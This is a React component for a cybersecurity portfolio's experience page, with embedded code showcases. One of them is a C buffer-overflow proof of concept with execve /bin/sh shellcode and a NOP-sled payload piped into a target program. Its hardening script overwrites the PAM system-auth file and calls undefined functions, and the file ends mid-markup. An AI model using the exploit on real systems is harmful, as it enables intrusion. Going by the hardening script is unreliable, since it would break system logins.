import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';

export default function Experience() {
  // Animation state using Intersection Observer
  const [isVisible, setIsVisible] = useState({});
  const sectionsRef = useRef({});
  const [activeFilter, setActiveFilter] = useState('all');

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            setIsVisible(prev => ({ ...prev, [entry.target.id]: true }));
          }
        });
      },
      { threshold: 0.1 }
    );

    Object.values(sectionsRef.current).forEach(ref => {
      if (ref) observer.observe(ref);
    });

    return () => observer.disconnect();
  }, []);

  const registerSection = (id, ref) => {
    if (ref && !sectionsRef.current[id]) {
      sectionsRef.current[id] = ref;
    }
  };

  // Expanded professional experience data with deep technical details
  const experiences = [
    {
      id: 'rtx-bbn',
      role: 'Cyber Researcher',
      company: 'RTX BBN',
      location: 'Cambridge, MA',
      period: 'May 2024 – Present',
      type: 'professional',
      logoColor: '#3b82f6',
      description: 'Leading innovative cybersecurity research projects to advance the state of the art in threat detection and mitigation strategies.',
      responsibilities: [
        'Conduct advanced vulnerability research across diverse systems and architectures',
        'Develop and refine novel approaches to network security analysis',
        'Lead research teams in exploring emerging attack vectors and defense mechanisms',
        'Publish technical findings in industry-leading security conferences and journals'
      ],
      achievements: [
        {
          title: 'Advanced Packet Analysis System',
          description: 'Developed sophisticated packet parsers and heuristic anomaly detection mechanisms, resulting in a 35% increase in protocol test coverage',
          tech: ['C/C++', 'Python', 'Scapy', 'tcpdump', 'Wireshark', 'Custom Protocol Analysis']
        },
        {
          title: 'Firmware Security Research',
          description: 'Led reverse-engineering initiatives that uncovered critical memory corruption vulnerabilities in embedded firmware, enabling preemptive patching',
          tech: ['Ghidra', 'IDA Pro', 'ARM Assembly', 'MIPS', 'Binary Analysis', 'Firmware Extraction']
        },
        {
          title: 'Exploit Development',
          description: 'Developed and weaponized Proof-of-Concept (PoC) exploits for real-world vulnerabilities, reducing exploit feasibility by 40%',
          tech: ['Python', 'C/C++', 'Assembly', 'ROP Chains', 'Buffer Overflow', 'Format String Vulnerabilities']
        },
        {
          title: 'Security Research Publication',
          description: 'Authored comprehensive technical reports on discovered vulnerabilities, influencing industry-wide security practices',
          tech: ['Technical Writing', 'CVE Reporting', 'Vulnerability Disclosure', 'Security Analysis']
        }
      ],
      codeHighlights: [
        {
          language: 'C',
          title: 'Custom Packet Parser Implementation',
          code: `// Advanced pattern-matching for network protocol analysis
typedef struct packet_header {
  uint32_t signature;
  uint16_t length;
  uint16_t flags;
  uint32_t sequence;
  uint8_t data[];
} __attribute__((packed)) packet_header_t;

int detect_anomalous_patterns(const packet_header_t *packet, size_t size) {
  if (size < sizeof(packet_header_t)) {
    return ERROR_INCOMPLETE_HEADER;
  }
  
  // Protocol verification with entropy analysis
  if (packet->signature != PROTOCOL_SIGNATURE) {
    return analyze_entropy(packet->data, packet->length);
  }
  
  // Deep packet inspection for heuristic detection
  return analyze_payload_patterns(packet->data, 
                                packet->length,
                                packet->flags & FLAG_ENCRYPTED);
}`
        },
        {
          language: 'Python',
          title: 'Automated Vulnerability Detection',
          code: `# Implement advanced heuristic detection for memory corruption
def analyze_binary_for_vuln(binary_path, arch='x86_64'):
    """
    Performs static analysis to identify potential memory corruption vulnerabilities
    using advanced pattern recognition and symbolic execution.
    """
    results = {}
    
    # Initialize analysis engine with architecture-specific rules
    analyzer = VulnAnalyzer(arch=arch, 
                           detection_mode='aggressive',
                           enable_symbolic=True)
    
    # Extract control flow graph and analyze paths
    cfg = analyzer.extract_cfg(binary_path)
    
    # Identify potentially dangerous function usage
    dangerous_calls = analyzer.find_patterns(
        ['strcpy', 'memcpy', 'sprintf', 'gets'],
        context_lines=5,
        check_bounds=True
    )
    
    # Perform taint analysis on identified paths
    tainted_paths = []
    for call in dangerous_calls:
        if analyzer.check_taint_propagation(call.address, call.parameters):
            tainted_paths.append(call)
    
    # Generate proof-of-concept for each vulnerability
    for path in tainted_paths:
        poc = generate_exploit_proof(path, arch)
        results[path.address] = {
            'type': path.vulnerability_type,
            'severity': path.severity,
            'exploitability': path.exploitation_score,
            'poc': poc
        }
        
    return results`
        }
      ]
    },
    {
      id: 'raytheon-rtx',
      role: 'Cyber Engineer',
      company: 'Raytheon, RTX',
      location: 'Aurora, CO',
      period: 'June 2023 – May 2024',
      type: 'professional',
      logoColor: '#10b981',
      description: 'Led security hardening initiatives and developed advanced threat modeling approaches for critical systems.',
      responsibilities: [
        'Designed and implemented comprehensive security strategies for enterprise networks',
        'Conducted in-depth threat modeling and vulnerability assessments',
        'Developed secure architecture solutions for mission-critical systems',
        'Mentored junior engineers on security best practices and vulnerability research'
      ],
      achievements: [
        {
          title: 'Threat Modeling Framework',
          description: 'Performed in-depth threat modeling and misconfiguration analysis, implementing tailored security policies that reduced attack vectors by 35%',
          tech: ['STRIDE', 'DREAD', 'MITRE ATT&CK', 'Threat Intelligence', 'Risk Assessment']
        },
        {
          title: 'Linux System Hardening',
          description: 'Hardened RedHat Linux systems via SELinux & automated scanning tools, cutting unauthorized access attempts by 30%',
          tech: ['SELinux', 'Linux', 'Bash Scripting', 'OpenSCAP', 'CIS Benchmarks', 'Security Automation']
        },
        {
          title: 'Security Architecture Design',
          description: 'Developed comprehensive security architecture for multi-tiered applications, implementing defense-in-depth strategies',
          tech: ['Zero Trust', 'Network Segmentation', 'IAM', 'Encryption', 'Security Controls']
        },
        {
          title: 'Vulnerability Management Program',
          description: 'Created an enterprise-wide vulnerability management workflow, reducing mean time to remediation by 40%',
          tech: ['Nessus', 'Tenable.io', 'CVSS Scoring', 'Remediation Planning', 'Patch Management']
        }
      ],
      codeHighlights: [
        {
          language: 'Bash',
          title: 'Automated Security Hardening Script',
          code: `#!/bin/bash
# Enterprise Linux hardening script with comprehensive security controls

# Define security parameters
SYSCTL_SECURE_PARAMS=(
  "kernel.randomize_va_space=2"
  "net.ipv4.conf.all.rp_filter=1"
  "net.ipv4.conf.default.rp_filter=1"
  "net.ipv4.icmp_echo_ignore_broadcasts=1"
  "net.ipv4.conf.all.accept_redirects=0"
  "net.ipv6.conf.all.accept_redirects=0"
  "net.ipv4.conf.all.send_redirects=0"
  "net.ipv4.conf.all.accept_source_route=0"
  "net.ipv6.conf.all.accept_source_route=0"
)

# Apply sysctl hardening
apply_sysctl_hardening() {
  echo "[+] Applying kernel hardening parameters..."
  for param in "${SYSCTL_SECURE_PARAMS[@]}"; do
    echo "$param" >> /etc/sysctl.d/99-security.conf
  done
  sysctl -p /etc/sysctl.d/99-security.conf
}

# Configure SELinux in enforcing mode
configure_selinux() {
  echo "[+] Configuring SELinux in enforcing mode..."
  setenforce 1
  sed -i 's/^SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config
  
  # Install SELinux management tools
  yum -y install policycoreutils policycoreutils-python setroubleshoot
}

# Secure authentication
harden_authentication() {
  echo "[+] Implementing secure authentication policies..."
  # Configure password quality
  authconfig --passalgo=sha512 --update
  
  # Set password policies
  cat > /etc/security/pwquality.conf << 'EOL'
minlen = 14
dcredit = -1
ucredit = -1
ocredit = -1
lcredit = -1
difok = 8
maxrepeat = 3
EOL

  # Configure account lockout
  echo "auth required pam_tally2.so deny=5 unlock_time=1800" > /etc/pam.d/system-auth
}

# Main execution
echo "[*] Starting system hardening process..."
apply_sysctl_hardening
configure_selinux
harden_authentication
setup_auditd
disable_unused_services
configure_firewall

echo "[+] System hardening complete. Generating compliance report..."
generate_compliance_report

exit 0`
        },
        {
          language: 'Python',
          title: 'Automated Security Assessment Tool',
          code: `import subprocess
import json
import os
import re
from datetime import datetime

class SecurityAssessment:
    def __init__(self, target_system, assessment_type="comprehensive"):
        self.target = target_system
        self.type = assessment_type
        self.results = {
            "system_info": {},
            "vulnerabilities": [],
            "misconfigurations": [],
            "compliance": {},
            "overall_score": 0
        }
        
    def scan_system(self):
        """Execute comprehensive security scan with multiple tools"""
        print(f"[+] Initiating {self.type} security assessment of {self.target}")
        
        # Gather system information
        self._gather_system_info()
        
        # Vulnerability scanning
        self._run_vulnerability_scan()
        
        # Configuration assessment
        self._assess_configurations()
        
        # Compliance checking
        self._check_compliance()
        
        # Calculate overall security score
        self._calculate_security_score()
        
        return self.results
        
    def _gather_system_info(self):
        """Collect detailed system information"""
        # OS identification and version
        os_info = subprocess.check_output("cat /etc/os-release", shell=True).decode()
        self.results["system_info"]["os"] = self._parse_os_info(os_info)
        
        # Kernel version
        kernel = subprocess.check_output("uname -r", shell=True).decode().strip()
        self.results["system_info"]["kernel"] = kernel
        
        # Network configuration
        self.results["system_info"]["network"] = self._analyze_network_config()
        
        # Installed packages
        self.results["system_info"]["packages"] = self._enumerate_packages()
    
    def _run_vulnerability_scan(self):
        """Execute vulnerability scan using multiple engines"""
        print("[+] Running vulnerability scan...")
        # Implement vulnerability scanning logic
        # This would integrate with tools like OpenVAS, Nessus, etc.
        
    def _assess_configurations(self):
        """Check for security misconfigurations"""
        print("[+] Assessing system configurations...")
        # Check SELinux status
        selinux = subprocess.check_output("getenforce", shell=True).decode().strip()
        if selinux != "Enforcing":
            self.results["misconfigurations"].append({
                "severity": "HIGH",
                "component": "SELinux",
                "description": "SELinux is not in enforcing mode",
                "recommendation": "Set SELinux to enforcing mode"
            })
        
        # Additional checks for SSH, firewall, etc.
        
    def _check_compliance(self):
        """Verify compliance with security standards"""
        print("[+] Checking compliance with security standards...")
        # Check CIS benchmarks, NIST, etc.
        
    def _calculate_security_score(self):
        """Calculate overall security score based on findings"""
        # Implement scoring algorithm
        vuln_count = len(self.results["vulnerabilities"])
        misconfig_count = len(self.results["misconfigurations"])
        
        # Calculate score based on findings
        total_issues = vuln_count + misconfig_count
        # More sophisticated calculation would go here
        
        self.results["overall_score"] = max(0, 100 - (total_issues * 5))
        
    def generate_report(self, output_format="json"):
        """Generate assessment report in specified format"""
        report_name = f"security_assessment_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        if output_format == "json":
            with open(f"{report_name}.json", "w") as f:
                json.dump(self.results, f, indent=4)
        
        print(f"[+] Assessment complete. Report saved as {report_name}.{output_format}")
        return f"{report_name}.{output_format}"

# Usage
if __name__ == "__main__":
    assessment = SecurityAssessment("production-server-01")
    results = assessment.scan_system()
    assessment.generate_report()`
        }
      ]
    },
    {
      id: 'raytheon-rtx-intern',
      role: 'Senior Cyber Engineering Intern',
      company: 'Raytheon, RTX',
      location: 'Aurora, CO',
      period: 'May 2022 – June 2023',
      type: 'professional',
      logoColor: '#10b981',
      description: 'Led penetration testing initiatives and conducted in-depth binary analysis to uncover security vulnerabilities.',
      responsibilities: [
        'Conducted comprehensive penetration testing against internal systems',
        'Performed reverse engineering of legacy applications to identify vulnerabilities',
        'Developed security tools to enhance internal assessment capabilities',
        'Collaborated with development teams to implement secure coding practices'
      ],
      achievements: [
        {
          title: 'Penetration Testing Framework',
          description: 'Simulated real-world attacks using Metasploit, C2 frameworks, and Burp Suite, strengthening defenses by 20%',
          tech: ['Metasploit', 'Burp Suite', 'Cobalt Strike', 'OWASP Top 10', 'Python', 'Web Exploitation']
        },
        {
          title: 'Legacy Binary Analysis',
          description: 'Reverse-engineered legacy binaries, identifying and mitigating 15+ exploitable vulnerabilities through static and dynamic analysis',
          tech: ['IDA Pro', 'Ghidra', 'x86/x64 Assembly', 'Dynamic Analysis', 'GDB', 'WinDbg']
        },
        {
          title: 'Security Tool Development',
          description: 'Created custom security assessment tools that streamlined vulnerability identification process by 30%',
          tech: ['Python', 'Go', 'Bash', 'REST APIs', 'SQL Injection', 'XSS Detection']
        },
        {
          title: 'Secure Development Training',
          description: 'Developed and delivered secure coding workshops for development teams, resulting in 25% fewer vulnerabilities in new code',
          tech: ['OWASP Secure Coding', 'Code Review', 'SAST', 'DAST', 'Dependency Scanning']
        }
      ],
      codeHighlights: [
        {
          language: 'Python',
          title: 'Custom Web Application Scanner',
          code: `#!/usr/bin/env python3
# Advanced web application vulnerability scanner 

import requests
import argparse
import re
import concurrent.futures
import json
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

class WebScanner:
    def __init__(self, target_url, threads=10, depth=2):
        self.target_url = target_url
        self.threads = threads
        self.max_depth = depth
        self.visited_urls = set()
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def scan(self):
        """Main scanning function"""
        print(f"[+] Starting scan of {self.target_url}")
        self.crawl(self.target_url, depth=0)
        
        # Analyze all discovered pages
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.analyze_page, url) for url in self.visited_urls]
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.vulnerabilities.extend(result)
                except Exception as e:
                    print(f"[!] Error analyzing page: {str(e)}")
        
        return self.vulnerabilities
    
    def crawl(self, url, depth=0):
        """Crawl website to discover pages"""
        if depth > self.max_depth or url in self.visited_urls:
            return
        
        try:
            response = self.session.get(url, timeout=10)
            self.visited_urls.add(url)
            
            if 'text/html' not in response.headers.get('Content-Type', ''):
                return
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract all links
            for link in soup.find_all('a', href=True):
                next_url = urljoin(url, link['href'])
                
                # Stay within the same domain
                if urlparse(next_url).netloc == urlparse(self.target_url).netloc:
                    self.crawl(next_url, depth + 1)
        
        except Exception as e:
            print(f"[!] Error crawling {url}: {str(e)}")
    
    def analyze_page(self, url):
        """Analyze a page for common vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = self.session.get(url)
            
            # Check for XSS vulnerabilities
            xss_vulns = self.check_xss(url, response)
            if xss_vulns:
                vulnerabilities.extend(xss_vulns)
            
            # Check for SQL injection
            sqli_vulns = self.check_sqli(url)
            if sqli_vulns:
                vulnerabilities.extend(sqli_vulns)
                
            # Check for sensitive information disclosure
            info_disclosure = self.check_info_disclosure(response)
            if info_disclosure:
                vulnerabilities.extend(info_disclosure)
        
        except Exception as e:
            print(f"[!] Error analyzing {url}: {str(e)}")
        
        return vulnerabilities
    
    def check_xss(self, url, response):
        """Check for XSS vulnerabilities"""
        # XSS detection logic
        pass
        
    def check_sqli(self, url):
        """Check for SQL injection vulnerabilities"""
        # SQL injection detection logic
        pass
        
    def check_info_disclosure(self, response):
        """Check for sensitive information disclosure"""
        # Information disclosure detection logic
        pass

# Usage example
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web Application Vulnerability Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Crawling depth")
    parser.add_argument("-o", "--output", help="Output file for results")
    
    args = parser.parse_args()
    
    scanner = WebScanner(args.url, args.threads, args.depth)
    vulnerabilities = scanner.scan()
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(vulnerabilities, f, indent=4)
    else:
        print(json.dumps(vulnerabilities, indent=4))`
        },
        {
          language: 'C',
          title: 'Binary Exploitation Proof of Concept',
          code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*
 * Proof of Concept for buffer overflow vulnerability in legacy application
 * CVE-2023-XXXXX
 */

#define BUFFER_SIZE 256
#define NOP_SLED_SIZE 128
#define RETURN_ADDR_REPEAT 32

// x86_64 shellcode to spawn /bin/sh
unsigned char shellcode[] = {
    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 
    0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 
    0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 
    0x3b, 0x0f, 0x05
};

void build_exploit_payload(char *buffer, size_t size, unsigned long ret_addr) {
    size_t shellcode_len = sizeof(shellcode);
    size_t i = 0;

    // Clear the buffer
    memset(buffer, 0, size);
    
    // 1. Add NOP sled at the beginning
    for (i = 0; i < NOP_SLED_SIZE && i < size; i++) {
        buffer[i] = 0x90; // NOP instruction
    }
    
    // 2. Add the shellcode after the NOP sled
    if (i + shellcode_len < size) {
        memcpy(buffer + i, shellcode, shellcode_len);
        i += shellcode_len;
    }
    
    // 3. Fill the remaining buffer with return address
    unsigned long *ptr = (unsigned long *)(buffer + i);
    for (; i < size - sizeof(unsigned long); i += sizeof(unsigned long)) {
        *ptr++ = ret_addr;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <vulnerable_program> <return_address>\n", argv[0]);
        return 1;
    }
    
    char *vuln_program = argv[1];
    unsigned long ret_addr = strtoul(argv[2], NULL, 0);
    
    char buffer[BUFFER_SIZE];
    build_exploit_payload(buffer, BUFFER_SIZE, ret_addr);
    
    // Write payload to file for testing
    FILE *fp = fopen("exploit_payload.bin", "wb");
    if (fp != NULL) {
        fwrite(buffer, 1, BUFFER_SIZE, fp);
        fclose(fp);
        printf("[+] Exploit payload written to exploit_payload.bin\n");
    }
    
    // Execute the vulnerable program with our payload
    printf("[+] Executing %s with exploit payload...\n", vuln_program);
    
    // Pipe the exploit payload to the vulnerable program
    FILE *proc = popen(vuln_program, "w");
    if (proc == NULL) {
        perror("popen");
        return 1;
    }
    
    fwrite(buffer, 1, BUFFER_SIZE, proc);
    pclose(proc);
    
    printf("[+] Exploit attempt completed\n");
    
    return 0;
}`
        }
      ]
    },
    {
      id: 'reata-pharmaceuticals',
      role: 'Information Security Intern',
      company: 'Reata Pharmaceuticals',
      location: 'Plano, TX',
      period: 'May 2021 – August 2021',
      type: 'professional',
      logoColor: '#f59e0b',
      description: 'Conducted vulnerability assessments and implemented security improvements for pharmaceutical IT infrastructure.',
      responsibilities: [
        'Performed vulnerability scanning and assessment of corporate infrastructure',
        'Assisted in security policy development and implementation',
        'Conducted security awareness training for employees',
        'Collaborated with IT teams to remediate identified vulnerabilities'
      ],
      achievements: [
        {
          title: 'Vulnerability Management',
          description: 'Conducted vulnerability scans using Nessus and OpenVAS, identifying critical security gaps and reducing exposure by 25%',
          tech: ['Nessus', 'OpenVAS', 'CVSS', 'Patch Management', 'Risk Assessment']
        },
        {
          title: 'Security Policy Development',
          description: 'Contributed to the development of comprehensive security policies aligned with industry regulations',
          tech: ['HIPAA', 'GDPR', 'ISO 27001', 'Policy Development', 'Compliance']
        },
        {
          title: 'Security Awareness Program',
          description: 'Developed and delivered security awareness training materials, improving employee phishing test results by 40%',
          tech: ['Security Awareness', 'Phishing Simulations', 'Training Development', 'Social Engineering']
        }
      ],
      codeHighlights: [
        {
          language: 'Python',
          title: 'Vulnerability Scan Parser and Reporter',
          code: `#!/usr/bin/env python3
# Vulnerability scan results parser and reporter

import sys
import csv
import json
import argparse
from datetime import datetime
import matplotlib.pyplot as plt
import numpy as np

def parse_nessus_csv(filename):
    """Parse Nessus CSV export and categorize findings"""
    findings = {
        "critical": [],
        "high": [],
        "medium": [],
        "low": [],
        "info": []
    }
    
    hosts = {}
    
    with open(filename, 'r') as file:
        reader = csv.DictReader(file)
        for row in reader:
            severity = row.get('Risk', '').lower()
            host = row.get('Host', '')
            plugin_id = row.get('Plugin ID', '')
            vulnerability = row.get('Name', '')
            description = row.get('Description', '')
            solution = row.get('Solution', '')
            
            if severity in findings:
                findings[severity].append({
                    "host": host,
                    "plugin_id": plugin_id,
                    "vulnerability": vulnerability,
                    "description": description,
                    "solution": solution
                })
            
            # Track vulnerabilities per host
            if host not in hosts:
                hosts[host] = {
                    "critical": 0,
                    "high": 0,
                    "medium": 0,
                    "low": 0,
                    "info": 0
                }
            
            if severity in hosts[host]:
                hosts[host][severity] += 1
    
    return findings, hosts

def generate_summary(findings, hosts):
    """Generate a summary of the findings"""
    total_findings = sum(len(findings[severity]) for severity in findings)
    total_hosts = len(hosts)
    
    # Count total by severity
    severity_counts = {severity: len(issues) for severity, issues in findings.items()}
    
    # Calculate risk score
    risk_score = calculate_risk_score(severity_counts)
    
    summary = {
        "scan_date": datetime.now().strftime("%Y-%m-%d"),
        "total_findings": total_findings,
        "total_hosts": total_hosts,
        "severity_counts": severity_counts,
        "risk_score": risk_score,
        "most_vulnerable_hosts": get_most_vulnerable_hosts(hosts, 5)
    }
    
    return summary

def calculate_risk_score(severity_counts):
    """Calculate risk score based on finding severity"""
    weights = {
        "critical": 10,
        "high": 5,
        "medium": 2,
        "low": 1,
        "info": 0
    }
    
    score = sum(severity_counts[severity] * weights[severity] for severity in severity_counts)
    return score

def get_most_vulnerable_hosts(hosts, limit=5):
    """Get the most vulnerable hosts based on weighted findings"""
    host_scores = {}
    
    for host, severities in hosts.items():
        score = calculate_risk_score(severities)
        host_scores[host] = score
    
    # Sort hosts by score and return top N
    sorted_hosts = sorted(host_scores.items(), key=lambda x: x[1], reverse=True)
    return sorted_hosts[:limit]

def generate_charts(summary, findings, output_prefix):
    """Generate visualization charts"""
    # 1. Severity distribution pie chart
    labels = list(summary["severity_counts"].keys())
    sizes = list(summary["severity_counts"].values())
    
    plt.figure(figsize=(10, 6))
    plt.pie(sizes, labels=labels, autopct='%1.1f%%', startangle=90,
            colors=['darkred', 'red', 'orange', 'yellow', 'blue'])
    plt.axis('equal')
    plt.title('Vulnerability Severity Distribution')
    plt.savefig(f"{output_prefix}_severity_distribution.png")
    
    # 2. Most vulnerable hosts
    hosts = [h[0] for h in summary["most_vulnerable_hosts"]]
    scores = [h[1] for h in summary["most_vulnerable_hosts"]]
    
    plt.figure(figsize=(12, 6))
    plt.barh(hosts, scores, color='red')
    plt.xlabel('Risk Score')
    plt.title('Most Vulnerable Hosts')
    plt.tight_layout()
    plt.savefig(f"{output_prefix}_vulnerable_hosts.png")
    
    return [f"{output_prefix}_severity_distribution.png", 
            f"{output_prefix}_vulnerable_hosts.png"]

def generate_report(summary, findings, chart_files, output_file):
    """Generate final HTML report"""
    # HTML report generation logic
    pass

def main():
    parser = argparse.ArgumentParser(description="Vulnerability Scan Report Generator")
    parser.add_argument("input_file", help="Path to Nessus CSV export file")
    parser.add_argument("-o", "--output", default="vulnerability_report",
                      help="Output file prefix")
    parser.add_argument("-f", "--format", choices=["html", "json", "pdf"],
                      default="html", help="Output format")
    
    args = parser.parse_args()
    
    try:
        findings, hosts = parse_nessus_csv(args.input_file)
        summary = generate_summary(findings, hosts)
        chart_files = generate_charts(summary, findings, args.output)
        
        if args.format == "html":
            generate_report(summary, findings, chart_files, f"{args.output}.html")
        elif args.format == "json":
            with open(f"{args.output}.json", 'w') as f:
                json.dump({"summary": summary, "findings": findings}, f, indent=4)
        elif args.format == "pdf":
            # PDF report generation would go here
            pass
            
        print(f"Report generated: {args.output}.{args.format}")
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())`
        }
      ]
    },
    {
      id: 'academic-projects',
      role: 'Academic Research',
      company: 'Personal',
      location: 'Various Locations',
      period: '2024 – 2025',
      type: 'academic',
      logoColor: '#8b5cf6',
      description: 'Conducted academic research in cybersecurity, focusing on novel approaches to security challenges.',
      achievements: [
        {
          title: 'Machine Learning for Intrusion Detection',
          description: 'Developed and evaluated machine learning models for network intrusion detection, achieving 95% accuracy on benchmark datasets',
          tech: ['Python', 'TensorFlow', 'Scikit-learn', 'Network Security', 'LSTM', 'Random Forest']
        },
        {
          title: 'Secure Software Development Framework',
          description: 'Created a comprehensive framework for integrating security throughout the software development lifecycle',
          tech: ['SDLC', 'DevSecOps', 'Static Analysis', 'Dynamic Analysis', 'Security Testing']
        },
        {
          title: 'Blockchain Security Analysis',
          description: 'Researched and analyzed security vulnerabilities in smart contract implementations',
          tech: ['Solidity', 'Ethereum', 'Smart Contracts', 'Vulnerability Analysis', 'Symbolic Execution']
        }
      ]
    }
  ];

  // Function to filter experiences
  const filteredExperiences = activeFilter === 'all' 
    ? experiences 
    : experiences.filter(exp => exp.type === activeFilter);

  // Function to copy code to clipboard
  const copyToClipboard = (code) => {
    navigator.clipboard.writeText(code)
      .then(() => {
        // Could add a toast notification here
        console.log('Code copied to clipboard');
      })
      .catch(err => {
        console.error('Failed to copy: ', err);
      });
  };

  return (
    <div className="min-h-screen">
      {/* Hero Section */}
      <section className="py-20 px-4 relative overflow-hidden">
        <div className="absolute inset-0">
          <div className="absolute inset-0 bg-gradient-to-b from-black via-transparent to-black z-0"></div>
          <div className="absolute top-1/4 -right-20 w-72 h-72 bg-pink-500/10 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute top-3/4 -left-20 w-96 h-96 bg-blue-500/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1.5s' }}></div>
        </div>
        
        <div className="container mx-auto relative z-10">
          <div className="max-w-4xl mx-auto text-center">
            <h1 className="text-5xl md:text-6xl font-bold mb-8 bg-gradient-to-r from-blue-400 to-pink-500 text-transparent bg-clip-text">
              Professional Experience
            </h1>
            <p className="text-xl text-gray-300 mb-8 max-w-3xl mx-auto">
              A journey through cybersecurity research, vulnerability discovery, and advanced defensive strategies
            </p>
            
            <div className="flex flex-wrap justify-center gap-3 mb-6">
              <button 
                onClick={() => setActiveFilter('all')}
                className={`px-5 py-2 rounded-full transition-all ${
                  activeFilter === 'all' 
                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 text-white shadow-lg shadow-pink-500/20' 
                    : 'bg-white/5 text-gray-300 hover:bg-white/10 border border-white/10'
                }`}
              >
                All Experience
              </button>
              <button 
                onClick={() => setActiveFilter('professional')}
                className={`px-5 py-2 rounded-full transition-all ${
                  activeFilter === 'professional' 
                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 text-white shadow-lg shadow-pink-500/20' 
                    : 'bg-white/5 text-gray-300 hover:bg-white/10 border border-white/10'
                }`}
              >
                Professional
              </button>
              <button 
                onClick={() => setActiveFilter('academic')}
                className={`px-5 py-2 rounded-full transition-all ${
                  activeFilter === 'academic' 
                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 text-white shadow-lg shadow-pink-500/20' 
                    : 'bg-white/5 text-gray-300 hover:bg-white/10 border border-white/10'
                }`}
              >
                Academic
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Experience Timeline */}
      <section className="py-16 px-4">
        <div className="container mx-auto">
          <div className="max-w-6xl mx-auto">
            {/* Timeline */}
            <div className="relative">
              {/* Vertical Line */}
              <div className="absolute left-8 md:left-1/2 top-0 bottom-0 w-1 bg-gradient-to-b from-pink-500 to-purple-500 transform md:translate-x-[-50%] shadow-glow"></div>
              
              {/* Experience Items */}
              <div className="space-y-24">
                {filteredExperiences.map((experience, idx) => (
                  <div 
                    id={`exp-${experience.id}`}
                    key={experience.id}
                    ref={el => registerSection(`exp-${experience.id}`, el)}
                    className={`relative flex flex-col md:flex-row gap-8 ${
                      idx % 2 === 0 || !experience.achievements ? 'md:flex-row' : 'md:flex-row-reverse'
                    }`}
                  >
                    {/* Timeline connector and logo */}
                    <div className="absolute left-8 md:left-1/2 top-0 w-16 h-16 rounded-full bg-black border-4 border-gray-800 transform translate-x-[-50%] z-10 flex items-center justify-center">
                      <div className={`w-10 h-10 rounded-full flex items-center justify-center text-white text-xl font-bold`} style={{ backgroundColor: experience.logoColor }}>
                        {experience.company.charAt(0)}
                      </div>
                    </div>
                    
                    {/* Experience Card */}
                    <div className={`md:w-[48%] ${idx % 2 === 0 ? 'md:ml-auto' : ''} pl-20 md:pl-0`}>
                      <div 
                        className={`glass p-8 rounded-xl border border-white/10 backdrop-blur-md transition-all duration-700 ${
                          isVisible[`exp-${experience.id}`] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'
                        }`}
                      >
                        <div className="mb-6">
                          <h3 className="text-2xl font-bold mb-1">{experience.role}</h3>
                          <div className="flex flex-wrap items-center gap-2 mb-2">
                            <span className="text-xl text-pink-400">{experience.company}</span>
                            <span className="text-gray-500">•</span>
                            <span className="text-gray-400">{experience.location}</span>
                          </div>
                          <span className="text-gray-500 text-sm">{experience.period}</span>
                        </div>
                        
                        <p className="text-gray-300 mb-6">{experience.description}</p>
                        
                        {experience.responsibilities && (
                          <div className="mb-6">
                            <h4 className="text-lg font-semibold mb-3">Key Responsibilities</h4>
                            <ul className="space-y-2">
                              {experience.responsibilities.map((resp, idx) => (
                                <li key={idx} className="flex items-start gap-2">
                                  <span className="text-pink-500 mt-1">•</span>
                                  <span>{resp}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
                        )}
                      </div>
                    </div>
                    
                    {/* Spacer or empty div for timeline layout */}
                    <div className={`hidden md:block md:w-[48%] ${idx % 2 === 0 ? '' : 'md:ml-auto'}`}></div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Technical Achievements Section */}
      <section className="py-20 px-4 bg-gradient-to-b from-black/80 to-black relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-32 bg-gradient-to-b from-black to-transparent"></div>
        <div className="container mx-auto relative z-10">
          <h2 className="text-4xl font-bold mb-16 text-center bg-gradient-to-r from-blue-400 to-pink-500 text-transparent bg-clip-text">
            Technical Achievements
          </h2>
          
          <div className="max-w-6xl mx-auto">
            {filteredExperiences.map((experience) => (
              experience.achievements && (
                <div 
                  key={`${experience.id}-achieve`}
                  id={`achieve-${experience.id}`}
                  ref={el => registerSection(`achieve-${experience.id}`, el)}
                  className={`mb-16 transition-all duration-700 ${
                    isVisible[`achieve-${experience.id}`] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'
                  }`}
                >
                  <h3 className="text-2xl font-bold mb-6 flex items-center gap-3">
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center text-white text-sm font-bold`} style={{ backgroundColor: experience.logoColor }}>
                      {experience.company.charAt(0)}
                    </div>
                    <span>{experience.company} - Key Projects</span>
                  </h3>
                  
